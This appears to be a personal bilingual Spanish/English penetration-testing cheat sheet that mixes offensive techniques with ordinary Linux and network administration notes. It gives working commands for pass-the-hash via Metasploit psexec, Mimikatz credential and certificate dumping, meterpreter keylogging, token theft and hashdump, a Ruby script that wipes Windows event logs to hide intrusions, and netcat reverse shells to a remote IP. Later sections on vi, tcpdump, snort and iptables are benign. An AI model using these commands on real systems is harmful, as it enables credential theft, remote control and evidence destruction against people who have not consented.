Pass the hash

"""""""""""""""""""""""""""""""""""""""""""""""""""psexec"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

Set the options and then exploit......
>>meterpreter

Error: 
[-] Exploit failed [no-access]: Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS_ACCESS_DENIED (Command=117 WordCount=0)
Solucion:
“HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters” with “RequireSecuritySignature” set to “0”
Error:
[-] Exploit failed [no-access]: Rex::Proto::SMB::Exceptions::LoginError Login Failed: The server responded with error: STATUS_LOGON_FAILURE (Command=115 WordCount=0)
Solucion: Concatenate the blank LM hash to the NTLM hash
00000000000000000000000000000000:




Dumping Hashes

""""""""""""""""""""""""""""""""""""""""""""""""""Mimikatz"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
>>mimikatz.exe
>>privilege::debug                             //nos da privilegios sobre LSA
>>sekurlsa::logonpasswords
...................muchos hashes y passwords...........

Se puede usar mimikatz como post/exploitation desde metasploit

Opcion 1)
Cargar mimikatz al sistema comprometido
>>meterpreter>> upload /home/mimikatz.exe c:\\AlgunLugarEscondido
>>meterpreter>> shell
C: > cd AlgunlLugarEscondido
c:\AlgunLugarEscondido > mimikatz.exe

To run mimikatz you well need mimikatz.exe and sekurlsa.dll on the system you're targeting. 
privilege::debug
inject::process lsass.exe sekurlsa.dll                   / or  inject::service samss sekurlsa.dll
@getLogonPasswords full
sekurlsa::logonpasswords full

Opcion 2) Use the mimikatz build-in on metasploit

>>meterpreter>>load mimikatz
>>meterpreter>>msv
>>meterpreter>>mimikatz_command -f samdump::hashes

>>mimikatz_command -f service::list

>>mimikatz_command -f sekurlsa::searchpasswords

>>mimikatz_command -f process::list

>>mimikatz_command -f sekurlsa::msv

>>mimikatz_command -f hash::lm

>>mimikatz_command -f hash::ntlm

>>mimikatz_command -f system::user

>>mimikatz_command -f system::computer

>>mimikatz_command -f samdump::hashes

>>mimikatz_command -f crypto::listStores CERT_SYSTE_STORE_CURRENT_USER       //lista contenedores de certificados
                                         CERT_SYSTEM_STORE_LOCAL_MACHINE
                                         CERT_SYSTEM_STORE_CURRENT_SERVICE
                                         CERT_SYSTEM_STORE_SERVICES
                                         CERT_SYSTEM_STORES_USERS
                                         CERT_SYSTEM_CURRENT_USER_GROUP_POLICY
                                         CERT_SYSTEM_LOCAL_MACHINE_GROUP_POLICY
                                         CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE
>>mimikatz_command -f crypto::listCertificates CERT_SYSTEM_STORE_LOCAL_MACHINE "Root"   //lista certificados de un contenedor
>>mimikatz_command -f crypto::exportCertificates CERT_SYSTEM_STORE_LOCAL_MACHINE "Root"  //exporta los certificados
Nota: en caso de que un certificado no permita ser exportado deberíamos parchear la CryptoAPI o el servicio de aislamiento
de claves CNG. >>crypto::patchapi   o   >>crypto::patchcng
>>mimikatz_command -f crypto::listProviders

Otras herramientas para Dump'ear hashes: Gsecdump.exe / Pwdump7 / Metasploit hashdump / 
      herramienta online para generar hashes: http://www.sinfocol.org/herramientas/hashes.php
                                              findmyhash (trabaja desde consola con servicios online)
mACHETE>> User3:1013:E7EED3F5C2C85B88AAD3B435B51404EE:6AA15B3D14492D3FA4AA7C5E9CDC0E6A:::
          - 1st field: username(Administrator, User1, etc.)
          - 2nd field: Relative Identification (RID):last 3-4 digits of the Security Identifier (SID) unique for each user
          - 3rd field : LM hash
	  - 4th field : NTLM hash

Nota: Desde WIN 8.1 & 2012R2 se aplica las siguientes medidas de ¿seguridad?
REF: https://technet.microsoft.com/library/dn344918.aspx#BKMK_CredentialsProtectionManagement
- Restricted admin mode for Remote Desktop Connection //Avoid user credentials to be sent to the server(and stolen)
-*Aun asi permite la autenticacion Pass-the-hash, pass-the-ticket & overpass-the-hash con CredSSP
- LSA Protection (Previene la inyeccion de codigo) //Deny memory access to LSASS process
-*Bypassed by a driver or another protected process (mimikatz has a Driver ;)
- Protected users Security group //no more (Mr Nice Guy) NTLM, WDigest, CredSSP, no delegation nor SSO, only Kerberos
-*Kerberos ticket can still be stolen and replayed (and smartcard/pin code is in memory;)
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

Eventos|EventLog|Authentication|logueos


""""""""""""""""""""""""""""""""""""wevtutil.exe ( Administrar Eventos WIN)""""""""""""""""""""""""""""""""""""""""""""""""

exportar un registro de eventos a un archivo:
#wevtutil epl Security C:\Eventos.evtx
obtener informacion sobre un evento
#wevtutil gl Microsoft-Windows-Winlogon/Diagnostic
obtener lista de los eventos
#wevtutil el
obtener lista de los publicadores de eventos
#wevtutil ep
hacer un backup de un evento-log y luego limpiar el registro de ese evento
#wevtutil cl application /bu:C:\Windows\log.evtx

"""""""""""""""""""""""""""""""""""wecutil.exe (Recopilador de eventos de Windows) """"""""""""""""""""""""""""""""""""""""
"Permite crear y administrar suscripciones a eventos reenviados desde origenes
de eventos remotos compatibles con el protocolo WS-Management"

""""""""""""""""""""""""""""""""""""""""""""""""""powershell""""""""""""""""""""""""""""""""""""""""""""""""""""""""
Extracting last 100 account authentication:
>>get-eventlog -log security | where-object {$_.EventID -match "^680$|^528$|^672$|^4768$|^4776$" –AND $_.UserName -notmatch 'SYSTEM|NETWORK SERVICE|LOCAL SERVICE|ANONYMOUS LOGON' –AND $_.TimeGenerated -gt [datetime]::today } | sort-object -property TimeGenerated | select-object -last 100 | Format-Table -AutoSize –Wrap

Extraer los ultimos 50 logueos y autenticaciones en una maquina remota en los ultimos 5 dias:
>>get-eventlog -computername MARTINPC -log security | where-object {$_.EventID -match  "^680$|^528$|^540$|^672$|^4768$|^4624$|^4776$" –AND  $_.Message -match "testuser1" –AND $_.TimeGenerated -gt  (get-date).adddays(-5) }| sort-object -property TimeGenerated | select-object -last 50 | Format-Table TimeCreated, ID, ProviderName, Message -AutoSize –Wrap

""""""""""""""""""""""""""""""""""""""""""""""""""""""wmic""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

Extraer autenticaciones y logueos en sistema remoto en un archivo HTML con formato de tabla
>>WMIC /node:remotesystem /output:c:\temp\authentication_events.html NTEVENT WHERE "LogFile='security' and (eventcode='680' or eventcode='528' or eventcode='672' or eventcode='4768' or eventcode='4776')" list brief /format:htable.xsl

Obtener detalles del Host
>>WMIC /node:192.9.200.10 /user:administrator /password:pass computersystem list brief /format:list
Obtener usuarios
>>WMIC /node:192.9.200.10 /user:administrator /password:pass computersystem get username
Crear un proceso
>>WMIC /node:192.9.200.10 /user:admin /password:pass process call create "calc.exe"
Listar procesos
>>WMIC /node:192.9.200.10 /user:admin /password:pass process get /format:list

"""""""""""""""""""""""""""""""""""""""""""""""""""Secpol.msc""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

Stop PasssTheHash
Secpol.msc/LocalPolicies/UserRightsAssignments/DebugPrograms       Delete Administrator/System

""""""""""""""""""""""""""""""""Limpiar Eventos a través de Consola RUBY on Metasploit"""""""""""""""""""""""""""""""""""""""
>>meterpreter>>irb
            [*]Starting IRB Shell
            [*]The 'client' variable node...
             >>log = client.sys.eventlog.open ('system')
             >>log.clear
             >> ;););););););););););););)   y no queda nada abajo de la alfombra...
             
        Tambien podemos hacer un script con esto:
        
        					# Clears Windows Event Logs
						evtlogs = [
        					'security',
        					'system',
        					'application',
        					'directory service',
        					'dns server',
        					'file replication service'
        					]
						print_line("Clearing Event Logs, this will leave an event 517")
						evtlogs.each do |evl|
        					print_status("Clearing the #{evl} Event Log")
        					log = client.sys.eventlog.open(evl)
        					log.clear
						end
						print_line("All Clear! You are a Ninja!")
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""             
             

Nota: Datos: 
-EVXT es el formato de log de eventos
-Logs Files are stored in %System32%winevt%logs
-Referencia: https://www.sans.org/reading-room/whitepapers/forensics/windows-logon-forensics-34132
             https://www.sans.org/reading-room/whitepapers/logging/evtx-windows-event-logging-32949
-Directivas de Seguridad Local En WIN : secpol.msc
-EventIDs List: http://ss64.com/ps/syntax-eventids.html
             

<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<METASPLOIT FRAMEWORK>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


"""""""""""""""""""""""""""""""""""""""""""""msfconsole comandos básicos:""""""""""""""""""""""""""""""""""""""""""""""""""

back          Move back from the current context
banner        Display an awesome metasploit banner
cd            Change the current working directory
color         Toggle color
connect       Communicate with a host
edit          Edit the current module with $VISUAL or $EDITOR
exit          Exit the console
get           Gets the value of a context-specific variable
getg          Gets the value of a global variable
go_pro        Launch Metasploit web GUI
Grep          the output of another command
help          Help menu
info          Displays information about one or more module
irb           Drop into irb scripting mode
jobs          Displays and manages jobs
kill          Kill a job
load          Load a framework plugin
loadpath      Searches for and loads modules from a path
makerc        Save commands entered since start to a file
popm          Pops the latest module off the stack and makes it active
previous      Sets the previously loaded module as the current module
pushm         Pushes the active or list of modules onto the module stack
quit          Exit the console
reload_all    Reloads all modules from all defined module paths
rename_job    Rename a job
resource      Run the commands stored in a file
route         Route traffic through a session
save          Saves the active datastores
search        Searches module names and descriptions
sessions      Dump session listings and display information about sessions
set           Sets a context-specific variable to a value
setg          Sets a global variable to a value
show          Displays modules of a given type, or all modules
sleep         Do nothing for the specified number of seconds
spool         Write console output into a file as well the screen
threads       View and manipulate background threads
unload        Unload a framework plugin
unset         Unsets one or more context-specific variables
unsetg        Unsets one or more global variables
use           Selects a module by name
version       Show the framework and console library version numbers


"""""""""""""""""""""""""""""""""""""""""""""""meterpreter comandos utiles:""""""""""""""""""""""""""""""""""""""""""""""""""

help
sysinfo
ls
use priv
ps
migrate PID
use incognito
list_tokens -u
list_tokens -g
steal_token PID
drop_token
getsystem
shell
execute -f cmd.exe -i
execute -f cmd.exe -H -i -t
rev2self
reg command
setdesktop number
screenshot
upload file
download file
keyscan_start
keyscan_dump
keyscan_stop
getprivs
uictl enable keyboard/mouse
background
hashdump
use sniffer
sniffer_interfaces
sniffer_dump interfaceID pcapname
sniffer_dump interfaceID packet-buffer
sniffer_stats interfaceID
sniffer_stop interfaceID
add_user username password -h ip
add_group_user 'Domain admins' username -h ip
clearev
timestomp
reboot
search
getuid




<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
NETBIOS/SMB

smbclient:

nmap'ear puerto 139
o
telnet'ear IP 139
if open...
nmblookup -B IP -S \*
if it has <20>....el recurso está compartido
                                            The values in the <xx> brackets can be:
                                            00 base computernames and workgroups, also in "*" queries
                                            01 master browser, in magic __MSBROWSE__ cookie
                                            03 messaging/alerter service; name of logged-in user  <--- This one is cool too
                                            20 resource-sharing "server service" name  <--- Check this one ---
                                            1B domain master-browser name
                                            1C domain controller name
                                            1E domain/workgroup master browser election announcement [?]
Herramientas relacionadas: nbtscan (Linux) + nbtstat (WIN) 

$smbclient -L \\\\COMPUTER -I IP
if password required, put the password ;)
$smbclient -L \\\\COMPUTER\\C -I IP -d 3 -n NAMEusedInThisNETBIOSsession -U userNameUsed

montando el sistema compartido:

$mount -t cifs //IP/Recurso_compartido /mnt/Punto_de_montaje -o username=USER,password=PASS
ó
$mount -t smbfs IP:/Recurso_compartido /mnt/punto_de_montaje -o username=USER,workgroup=TEST
ó
$smbmount //IP/Recurso_compartido /mnt/Punto_de_montaje -o username=USER
ó
$smbmount "\\\Samba1\\Recurso" -U USER -c 'mount /Recurso -u 500 -g 100'


"""""""""""""""""""""""""""""""""""""""""""""""nbtscan""""""""""""""""""""""""""""""""""""""""""""""""""""""""

Informacion sobre un host netbios
ejemplo:
$nbtscan -vh 192.9.200.10
                        Doing NBT name scan for addresses from 192.9.200.10
                        NetBIOS Name Table for Host 192.9.200.10:
			Incomplete packet, 155 bytes long.
			Name             Service          Type
			----------------------------------------
			SRV-CENTRAL      Workstation Service
			WORKGROUP        Domain Name
			SRV-CENTRAL      File Server Service
			Adapter address: 00:25:64:fc:c2:94
			----------------------------------------

"""""""""""""""""""""""""""""""""""""""""""""""psexec"""""""""""""""""""""""""""""""""""""""""""""""""""""""""
in MSFCONSOLE
>>search psexec
>>use exploit/windows/smb/psexec
Configure options and then...
>>exploit

;););););););););););););););)










<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>



ver servicios:

$cat /etc/services 

buscar un servicio especifico

$cat /etc/services |grep openvpn



<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>



Editor vi

_Cursor:
hjkl : izq/aba/arr/der
b mueve el cursor al comienzo de la palabra anterior
e mueve el cursor al final de la palabra siguiente
0 mueve el cursor al comienzo de la línea (cero)
$ mueve el cursor al final de la línea
_Entrada de texto:
a añade texto a partir del carácter en que está situado el cursor.
A añade texto al final de la línea actual.
i inserta texto a partir de la posición del cursor
I inserta texto al principio de la línea actual.
o inserta una línea debajo de la posición del cursor
O inserta una línea encima de la posición del cursor
:r fich  permite insertar el fichero fich tras la línea actual
_Borrar y cambiar texto:
x borra el carácter en el cursor
nx borra n caracteres hacia la derecha, incluido el que está sobre el cursor.
nX borra n caracteres hacia la izquierda.
r sustituye el carácter en el cursor
dd borra la línea en la que está el cursor
dw borra la palabra actual
ndd borra n líneas hacia abajo incluyendo la que contiene el cursor.
_Dehaciendo comandos:
u deshace el comando previo
U deshace todos los cambios realizados en la linea actual
_Abandonar vi:
ZZ Guarda los cambios en el fichero original, y vuelve al intérprete de comandos
:wq Igual que ZZ
:q! Abandona el editor, no guarda los cambios, y vuelve al intérprete de comandos
_Scroll de pantalla:
ctrl-d una pantalla abajo
ctrl-u una pantalla arriba
_Busqueda:
Otro método de posicionarse dentro de un fichero es buscando una cadena de caracteres. En el modo de comandos, cualquier cadena de caracteres precedida por / significa el comando de búsqueda hacia adelante. El cursor se posiciona en la primera ocurrencia de dicha cadena.
El comando n busca hacia adelante la siguiente ocurrencia.
Para buscar hacia atrás, se utiliza el comando ?


<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


listar archivos

listar con (l)listado largo, (h)formato entendible, (g)sin mostrar grupo, (o)sin mostrar dueño
$ls -lhgo
listar recursivamente incluyendo subdirectorios (R)
$ls -lhgoR
listar omitiendo mayusculas o minusculas (i), y enviando el resultado al fichero listado.txt
$ls -lhgo|grep -i *.txt > /root/listado.txt
	




<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


tcpdump

operadores: and|or|not ; inbound|outbound (para PPP protocols) ; 

listar interfaces
$tcpdump -D   
guardar la captura en file.cap
$tcpdump -w file.cap
ver direcciones IP y numeros de puerto en lugar de nombre de dominio y servicio
$tcpdump -n
capturar paquetes donde el destino es 192.168.1.1
$tcpdump -n dst host 192.168.1.1
capturar paquetes cuyo origen es 192.168.1.1
$tcpdump -n src host 192.168.1.1
capturar paquetes cuyo destino u origen sea 192.168.1.1
$tcpdump -n host 192.168.1.1
capturar paquetes cuya red de destino/origen/origen+destino sea 192.168.1.0/24
$tcpdump -n dst net 192.168.1.0/24 | $tcpdump -n src net 192.168.1.0/24 | $tcpdump -n net 192.168.1.0/24
capturar paquetes cuyo puerto de destino sea 23
$tcpdump -n dst port 23
capturar paquetes cuyo rango de puertos de destino este entre 1-1024
$tcpdump -n dst portrange 1-1024
capturar paquetes TCP cuyo rango de puertos de destino este entre 1-1024
$tcpdump -n tcp dst portrange 1-1024
capturar paquetes con destino 192.168.1.1 y puerto 23
$tcpdump -n "dst host 192.168.1.1 and dst port 23"
capturar paquetes con destino 192.168.1.1 y puerto 23 o 80
$tcpdump -n "dst host 192.168.1.1 and (dst port 23 or dst port 80)"
capturar paquetes icmp
$tcpdump -v icmp
capturar paquetes arp
$tcpdump -v arp
capturar paquetes icmp o arp (lo mismo para el resto de los protocolos: tcp,udp,rarp,ip,ipv6) 
$tcpdump -v "arp or icmp"
capturar paquetes broadcast o multicast
$tcpdump -n "broadcast or multicast"
capturar 500 bytes de datos por cada paquete en lugar de los 68 bytes por default
$tcpdump -s 500
buscando a metasploit
$tcpdump -r5g.pcap -l -s0 -w - | strings | grep "PUT /"


Advanced tcpdump ----------------->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

_____________________________________IP HEADER______________________________
|                                                                          |
0                                      16                                 31
|-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|	
| VERSION(4)|IHL(4)|TYPE OF SERVICE(8) |      TOTAL LENGTH    (16)         |
----------------------------------------------------------------------------
|       IDENTIFICATION  (16)           |FLAGS (3) FRAGMENT OFFSET (13)     |
----------------------------------------------------------------------------
|       TTL (8) PROTOCOL (8)           |   HEADER CHECKSUM (16)            |
----------------------------------------------------------------------------
|                       IP ORIGEN   (32)                                   |
----------------------------------------------------------------------------
|                       IP DESTINO  (32)                                   |
----------------------------------------------------------------------------
|  OPCIONES (VARIA TAMAÑO) + RELLENO (PARA CABECERA MULTIPLO DE 32 BITS)   |
|+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-|


____________________________________TCP HEADER______________________________
|                                                                          |
|                                                                          |
|+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-|
|  SOURCE PORT (16BITS)               |    DEST PORT   (16 )               |
|--------------------------------------------------------------------------|
|                             SEQUENCE NUMBER                              |
----------------------------------------------------------------------------
|                         ACKNOWLEDGMENT NUMBER                            |
|--------------------------------------------------------------------------|
| DATA OFFSET (4) RESERVED (3)        |        WINDOW SIZE  (16)           |    
| FLAGS (9) NS/CWR/ECE/U/A/P/R/S/F    |                                    |
|--------------------------------------------------------------------------|
|          CHECKSUM (16)              |URGENT POINTER(16)if URG flag is set|
|--------------------------------------------------------------------------|
|          OPTIONS (VARIABLE 0-320 BITS, DIVISIBLE BY 32)                  |
|      Nota: Options (Padded at the end with "0" bytes if necessary.)      |
|--------------------------------------------------------------------------|
|+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-|






captura paquetes desde la interfaz wlan0, cantidad de paquetes 10, filtrando por flag SYN en el paquete tcp
$tcpdump -i wlan0 -c10 'tcp[13]=2'
captura paquetes, -l activando un buffer de linea, filtrando tcp, puerto 80, host x.x.x.x, usando el comando string (que imprime datos reconocidos
como texto), y GREPeampos HTTP, el operador -w - escribe los datos a un STDOUT en lugar de un archivo.
$tcpdump -i wlan0 -l -w - tcp host x.x.x.x dst port 80 \ | strings | grep http
captura de paquetes, filtrado tcp, puerto 80, net x.x.x.x/X, STRINGeando, GREPeando las lineas 'GET\|Host' para ver las URL
$tcpdump -i wlan0 -l -w - net x.x.x.x/X and port 80 \ | strings | grep 'GET\|Host' 

ejemplo masking: 
IP HEADER:
Version+IHL: 01000101 (valor comun de este campo en IPv4)
para enmascarar los primeros 4 bits y filtrar solamente teniendo en cuenta los ultimos 4 bits (IHL):
0100 0101: 1° byte original
0000 1111: masking the byte. 0 va a enmascarar los valores y 1 los mantiene (0xF en Hex o 15 en Dec)
----------
0000 0101: resultado de enmascarar. 
en forma practica, para tcpdump sería:
$tcpdump -i eth0 'IP[0] & 15 > 5'
ó
$tcpdump -i eth0 'IP[0] & 0xF > 5'

captura paquetes con el bit MF, incluyendo el ultimo paquete que tiene el bit MF seteado a 0, teniendo en cuenta que
el bit DF va a estar en 0 en este ultimo paquete y no en 1. (Matching the fragments and the last fragments)
$tcpdump -i eth0 '((ip[6:2] > 0) and (not ip [6] = 64))'

captura paquetes con los flags SYN-SYN/ACK and not ACK
Enmascaramos el ACK para capturar solamente SYN y SYN/ACK
00010010 : SYN-ACK packet
00000010 : mask (2 in decimal)
--------
00000010 : result (2 in decimal)

Every bits of the mask match !
$tcpdump -i eth1 'tcp[13] & 2 = 2'







<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>



copiar archivos a traves de SSH:

hacia el remoto
$ scp FILE.txt user@servidor:~/directorio_remoto
desde el remoto
$ scp user@servidor:/home/usuario
copiar desde un servidor a otro:	
$ scp user@servidor1:/root/FILE.txt user@servidor2:/root
copia carpeta completa:
$ scp -r /carpeta_local user@servidor:/directorio_remoto


>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

snort:

installation from sources
gzip -d and tar xvf tar.gz

$ ./configure
$ make
$ make install

**********************modos de ejecucion:
sniffer mode
packet logger mode
network intrussion detection system(NIDS)
inline mode
*****************************************

argumentos:  $ snort -v/-vd/-vde ; $ snort -vde -l ./log ; $ snort -b -l ./log ;


directorios utiles: generators (generators ID resume) ; gen-msg.map (Signature/Snort ID) ; 


reglas:

pueden ser creadas manualmente/ bajadas desde snort.org o administradas automaticamente con PulledPork (googlecode o github)

$ tar xvzf pulledpork.tar.gz
$ cd pulledpork
$ cp pulledpor k.pl /usr/local/bin/ && chmod +x /usr/local/bin/pulledpork.pl



________________________________________SNORT posibles errores_________________________________________________________
"instalando en Linux / ParrotSec 4.2.6-parrot-686-pae / Linux parrot 4.2.6-parrot-686-pae #1 SMP Wed Dec 30 12:40:13 EST 2015 i686 GNU/Linux"
  

- ERROR!  dnet header not found, go get it from _____>>>> apt-get install libdnet-dev / apt-get install libdumbnet-dev
- ERROR!  daq_static library not found, go get it from ______>>>> bajar el daq.tar.gz de  snort.org _____>> ./configure & make & make install (Errores en la instalacion de DAQ: LEX y BISON ___>>>> apt-get install flex & bison

- ERROR   al intentar iniciar $ snort
"snort: error while loading shared libraries: libsfbpf.so.0: cannot open shared object file: No such file or directory"
__________>>>> solucion:  $ ldconfig


- ERROR!  pcap DAQ does not support inline _______>>>> usar afpacket ó nfq como DAQ en lugar de pcap
Ex. $ snort -de -i eth0:eth1 --daq-dir /usr/local/lib/daq/daq_afpacket.la -c ../snort.conf 

______________________________________PULLEDPORK posibles errores______________________________________________________

Siguiendo el Step by Step: (https://s3.amazonaws.com/snort-org-site/production/document_files/files/000/000/069/original/Snort-IPS-Tutorial.pdf?AWSAccessKeyId=AKIAIXACIED2SPMSC7GA&Expires=1456431963&Signature=SWPzAjItKty46b%2B0qXkqRGy6Vro%3D)    mega.z -_-

Despues de configurar pulledpork......... 
$ /usr/local/bin/pulledpork.pl -c /usr/local/etc/snort/pulledpork.conf -T -l
"If all goes well, PulledPork consolidated all rules into one file at /etc/snort/rules/snort.rules" ;)



- ERROR   Can't locate Crypt/SSLeay.pm....bla bla bla....BEGIN failed--compilation aborted at /usr/local/bin/  pulledpork.pl line 28.

__________>>>> solucion:  $ perl -MCPAN -e shell
           (perl shell)   $ install Crypt::SSLeay (Ojo! ver Posible ERROR:) solucion: apt-get install libssl-dev       

Posible ERROR:     openssl-version.c:2:30: fatal error: openssl/opensslv.h: No existe el fichero o el directorio
 #include <openssl/opensslv.h>
                              ^
compilation terminated.
Failed to build and link a simple executable using OpenSSL
No 'Makefile' created  NANIS/Crypt-SSLeay-0.72.tar.gz
  /usr/bin/perl Makefile.PL INSTALLDIRS=site -- NOT OK
Failed during this command:
 NANIS/Crypt-SSLeay-0.72.tar.gz               : writemakefile NO -- No 'Makefile' created


Notas utiles: https://github.com/nanis/Crypt-SSLeay
              https://metacpan.org/pod/Crypt::SSLeay#INSTALL
              
_______________________________________________________________________________________________________________________



_______________________________________________________________________________________________________________________


«««««««««««««««««««««««««««««««««««««««««««««««««««««««««««»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»

netcat:


$ netcat -lpv 9999 
"escuchando en el puerto 9999"

$ netcat -e /bin/sh 192.9.200.99 9999
"se conecta al listen abierto en el anterior comando abriendo una shell" LINUX

$ netcat -e cmd.exe 192.9.200.99 9999
"se conecta al listen abierto y abre una terminal cmd.exe" WINDOWS


«««««««««««««««««««««««««««««««««««««««««««««««««««««««««««»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»

iptables:

chains: INPUT/OUTPUT/FORWARD
rules: ACCEPT/DROP(descarta)/REJECT(rechaza)/POSTROUTING(encaminamiento posterior)
       /PREROUTING(encaminamiento previo)/SNAT/NAT

-A                   "añade una cadena, la opcion -i define una interfaz de trabajo entrante"
-o                   "define una interfaz para trabajo saliente"
-j                   "añade una regla de destino del tráfico, que puede ser ACCEPT, DROP, REJECT
-m                   "define que se aplica la regla si hay una coinncidencia especifica"
--state              "define una lista de distinto estados de las conexiones (INVALID, ESTABLISHED, NEW, RELATED)"
--to-source          "define que IP reportar al trafico externo"
-s                   "define trafico de origen"
-d                   "define trafico de destino"
--source-port        "define el puerto desde el que se origina la conexion"
--destinatio-port    "define el puerto hacia el que se dirige la conexion"
-t                   "tabla a utilizar, pueder ser nat, filter, mangle o raw"

Ejemplos de Reglas:

$ iptables -A FORWARD -i eth0 -o eth0 -j ACCEPT
"Reenvío desde una interfaz de red local (eth1) hacia una interfaz de red publica (eth0)

$ iptables -A FORWARD -i eth0 -o eth1 -m state --state ESTABLISHED,RELATED -j ACCEPT
"Aceptar reenviar los paquetes que son parte de conexiones existentes (ESTABLISHED) o relacionadas de tráfico entrante desde la interfaz eth1 para tráfico saliente por la interfaz eth0:"

$ iptables -A INPUT -i eth0 -m state --state ESTABLISHED,RELATED -j ACCEPT
"Permitir paquetes en el pro	pio muro cortafuegos para tráfico saliente a través de la interfaz eth0 que son parte de conexiones existentes o relacionadas:"

$ iptables -A INPUT -i eth1 -s 0/0 -d 0/0 -j ACCEPT
$ iptables -A INPUT -i lo -s 0/0 -d 0/0 -j ACCEPT
"Permitir (ACCEPT) todo el tráfico entrante (INPUT) desde (-s) cualquier dirección (0/0) la red local (eth1) y desde el retorno del sistema (lo) hacia (-d) cualquier destino (0/0):"

$ iptables -A POSTROUTING -t nat -s 192.168.0.0/24 -o eth0 -j SNAT --to-source x.y.z.c
"Hacer (-j) SNAT para el tráfico saliente (-o) a tráves de la interfaz eth0 proveniente desde (-s) la red local (192.168.0.0/24) utilizando (--to-source) la dirección IP w.x.y.z."

$ iptables -A INPUT -i eth0 -s w.x.y.x/32 -j DROP
$ iptables -A INPUT -i eth0 -s 192.168.0.0/24 -j DROP
$ iptables -A INPUT -i eth0 -s 127.0.0.0/8 -j DROP
"Descartar (DROP) todo el tráfico entrante (-i) desde la interfaz eth0 que trate de utilizar la dirección IP pública del servidor (w.x.y.z), alguna dirección IP de la red local (192.168.0.0/24) o la dirección IP del retorno del sistema (127.0.01)"

$ iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 25 --syn -j ACCEPT
$ iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 80 --syn -j ACCEPT
$ iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 443 --syn -j ACCEPT
$ iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 22 --syn -j ACCEPT
"Aceptar (ACCEPT) todos los paquetes SYN (--syn) del protocolo TCP (-p tcp) para los puertos (--destination-port) de los protocolos SMTP (25), HTTP(80), HTTPS (443) y SSH (22):"

$ iptables -A INPUT -p tcp -s 0/0 -d w.x.y.z/32 --destination-port 25 --syn -j ACCEPT
"Aceptar (ACCEPT) todos los paquetes SYN (--syn) del protocolo TCP (-tcp) para los puertos (--destination-port) del protocolos SMTP (25) en el servidor (w.x.y.z/32), desde (-s) cualquier lugar (0/0) hacia (-d) cualquier lugar (0/0)."

$ iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 110 --syn -j ACCEPT
$ iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 995 --syn -j ACCEPT
$ iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 143 --syn -j ACCEPT
$ iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 993 --syn -j ACCEPT
"Aceptar (ACCEPT) todos los paquetes SYN (--syn) del protocolo TCP (-p tcp) para los puertos (--destination-port) de los protocolos POP3 (110), POP3S (995), IMAP (143) y IMAPS (993):"

$ iptables -A INPUT -i eth1 -p tcp --sport 68 --dport 67 -j ACCEPT
$ iptables -A INPUT -i eth1 -p udp --sport 68 --dport 67 -j ACCEPT
